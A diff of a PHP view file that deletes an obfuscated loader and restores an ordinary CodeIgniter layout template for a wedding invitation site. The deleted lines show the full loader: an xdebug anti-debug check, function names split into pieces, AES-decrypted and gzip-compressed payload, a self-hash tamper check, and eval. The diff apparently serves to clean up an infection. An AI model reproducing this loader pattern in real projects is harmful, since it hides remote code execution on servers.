@@ -1,28 +1,50 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ysf6evj9=('bas'.'e64'.'_de'.'cod'.'e');
-$_sxdpbdpv=('gzu'.'nco'.'mpr'.'ess');
-$_g61t6xe4=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_e37pm2ul='uknaiKOb';
-$_b3xf6a79='2WqjMosQ';
-$_zcr5zk10='Hj7FrcS2D/o=';
-$_ztoj4f2p='5iWIF7dw';
-$_ni3ze4z3='XrDwIrCR';
-$_u6dalcuz='/qdob3EW';
-$_xyhar05l='FQEcFBJj';
-$_usxsxto8='n6E/GQ==';
-$_db6717es=$_ysf6evj9($_ni3ze4z3.$_e37pm2ul.$_b3xf6a79.$_ztoj4f2p.$_zcr5zk10);
-$_v3ih2xob=$_ysf6evj9($_u6dalcuz.$_xyhar05l.$_usxsxto8);
-$_vyz51xxs=$_ysf6evj9('h6tykrhF4a+D1+TE4yWZukf989q2RkDa6TJo26rri8bUj56lXLxhGlAWGWbJs6juZl8qifa7j4sEDr5TONZzTV1xNBDOHRSDmTjLlxCREXwfc2O9te0EKGdll5mgPN8UhnGRChg717oAOlSRL+kjOdvvAtJnUXSDtyA6Uw0EZbL1+3Fif+qNfkqeSQ6CojlfM5xw5x/wKb250O4yH6jV9DsjSiDReBoEtX7PjU8Qe9tjZObuocxXiPzQp7lzRGe8NblitOFtid2i2Grhkkj9FYhr7zF68go3HPYoOZ27ElDwunZR5sLFk2mLeoMNX0tI9WH80MAxltmfellMwzhoFIZg0K69Ak2G9i1I5N6CvNDJxrzaTKLrVwcIdjIyoJvwlgFhHrGy1Cw6FjxNm2jOSGQ3SoktX2fFKY6l4z8VXxA+fHZc55x5AMnrt4wZvsXHzMNwlugC6YqZmaCfG4ol9lc0hCeP9Kuz40P8AtkS6ByghFstbx8Mdhf+DRw0wDlocWdkdcjHE2Qh/0x4UIj5AHtxjUaOuZiwMEOoI/NFP3TYMTmEoqQQxTGzcfi2eX27JKyrIGm5fr+iRn/Nqx8aWwpobn6Q4GJToS83u/UuVBToQS9DGoqJGus36vPI2F0dlAQ3P8l7hujHvuHBKyMWcE8Xt2p18XP3SlXktE7JUbJyD0JIC00xmcnTbCaHy6QIjBKvX0tX0UKpTb0+l0r50pmkA/G2GwBNUG5oJ7Xe6vmIHSUJP+kxSueBi9nMaXlCWV5tVbYmFJVfIhNukBcBQagOiPh1KOYKmjBcoqwY1fJKlw2EoxDDvfNrs9IvyGUX56zg8xj9m+Mt/akiKf2BFRf3hddd1dmrcpIadbYr/CcsYofkoWGZG0Hg3p+QRKWB7+qHvb0BK9oAnX5HWoT7R50T461czl74Q+eCv1xB5dDMG7z4mbzjku5EUzrTFTUgRWXak3+8sp9/6XTH1bPbWayBvDa91TCWeK06z0DO8cU7RfdeqLC0qwTZ7zlNhSCeiXUBuCvOaFizzXI03W/t69JJ3gAkzNWonACCFxJTI5Czy+5VujL1ADOQd4OKGfxlH2ueSTwYB7BmZBleV7RApiCQrUHUhjaU6orMK/TB5mH2irWmeeRqXhGLmUWx0sDvt6JikKtrecehhVWcxHPAtb+9drrF/6vuKYcAUBoToX53bDLPpPIjoR5b4JFxT1CORbe1UMewJ2RCrx1SpaDdrAcqtoTqOjZykAIjltmsrAtDunpdcbS4lpRozcIt0AWhLsiTdOWqTDL3GOaN6QsjTA==');
-$_skwo1gz6=$_g61t6xe4($_vyz51xxs,'aes-256-cbc',$_db6717es,OPENSSL_RAW_DATA,$_v3ih2xob);
-if($_skwo1gz6===false){exit;}
-$_wl35cpyr=$_sxdpbdpv($_skwo1gz6);
-if($_wl35cpyr===false){exit;}
-$_dpprul9m='24222a446fab8a84fda715725ee74b8eb412581ac67eb741c409461838fe4b57';
-$_roh2jm0k=@file_get_contents(__FILE__);
-if($_roh2jm0k!==false){
-$_pelaha95=str_replace($_dpprul9m,"0000000000000000000000000000000000000000000000000000000000000000",$_roh2jm0k);
-$_rl84ga06=hash("sha256",$_pelaha95);
-if($_rl84ga06!==$_dpprul9m){@http_response_code(403);exit;}
-}
-eval($_wl35cpyr);
+ defined('BASEPATH') OR exit('No direct script access allowed');
+$this->load->helper('edit'); ?>
+<!doctype html>
+<html lang="<?= lang_cur() ?>" data-theme="<?= e($theme) ?>">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="robots" content="noindex, nofollow">
+<title><?= e(__($title)) ?></title>
+<meta property="og:title" content="<?= e(__($title)) ?>">
+<?php if (!empty($img['img.hero_main'])): ?><meta property="og:image" content="<?= photo_url($img['img.hero_main'], 'm') ?>">
+<?php 
+if (empty($invite_card)): list($p_x, $p_y, $p_z) = $this->content_model->image_pos('img.hero_main'); ?>
+<link rel="preload" as="image" imagesrcset="<?= e(photo_srcset($img['img.hero_main'], 'm')) ?>" imagesizes="<?= e(ed_img_sizes('img.hero_main', $p_z, $theme)) ?>" fetchpriority="high">
+<?php endif; endif; ?>
+<meta name="csrf-name" content="<?= e($this->security->get_csrf_token_name()) ?>">
+<meta name="csrf-hash" content="<?= e($this->security->get_csrf_hash()) ?>">
+<meta name="base-url" content="<?= e(base_url()) ?>">
+<link rel="icon" href="<?= asset_url('img/icon.svg') ?>" type="image/svg+xml">
+<link rel="stylesheet" href="<?= asset_url('fonts/fonts.css') ?>">
+<link rel="stylesheet" href="<?= asset_url('css/app.css') ?>">
+<link rel="stylesheet" href="<?= asset_url('css/wedding.css') ?>">
+<link rel="stylesheet" href="<?= asset_url('css/wedding-themes.css') ?>">
+<?php 
+if (pro_enabled()): foreach ($this->content_model->registry('themes') as $pk => $pt): if (!empty($pt['pro']) && ($draft || $pk === $theme) && is_file(FCPATH . 'assets/css/pro/' . $pk . '.css')): ?>
+<link rel="stylesheet" href="<?= asset_url('css/pro/' . $pk . '.css') ?>">
+<?php endif; endforeach; endif; ?>
+<?php if ($draft): ?><link rel="stylesheet" href="<?= asset_url('css/editor.css') ?>"><?php endif; ?>
+<?php if (!empty($invite_card)):  ?><link rel="stylesheet" href="<?= asset_url('css/invite-card.css') ?>">
+<link rel="stylesheet" href="<?= asset_url($this->content_model->card_paths($card_style)['css']) ?>"><?php endif; ?>
+<?php if (!empty($gift) || $draft): ?><link rel="stylesheet" href="<?= asset_url('css/gift.css') ?>"><?php endif; ?>
+<?= i18n_script() ?>
+</head>
+<body class="wd<?= $draft ? ' is-draft' : '' ?>">
+<?php $this->load->view('partials/flash'); ?>
+<?php $this->load->view($content_view); ?>
+<?php $this->load->view('partials/lightbox'); ?>
+<script src="<?= asset_url('js/app.js') ?>"></script>
+<script src="<?= asset_url('js/music.js') ?>"></script>
+<script src="<?= asset_url('js/wedding.js') ?>"></script>
+<?php if (!empty($invite_card)): ?><script src="<?= asset_url('js/invite-card.js') ?>"></script><?php endif; ?>
+<?php if (!empty($gift)): ?><?php if (!$draft): ?><script src="<?= asset_url('js/vendor/qrcode.js') ?>"></script><?php endif; ?><script src="<?= asset_url('js/gift.js') ?>" defer></script><?php endif; ?>
+<?php if ($draft): ?>
+<script src="<?= asset_url('js/vendor/qrcode.js') ?>"></script>
+<script src="<?= asset_url('js/uploader.js') ?>"></script>
+<script src="<?= asset_url('js/editor.js') ?>"></script>
+<?php endif; ?>
+</body>
+</html>
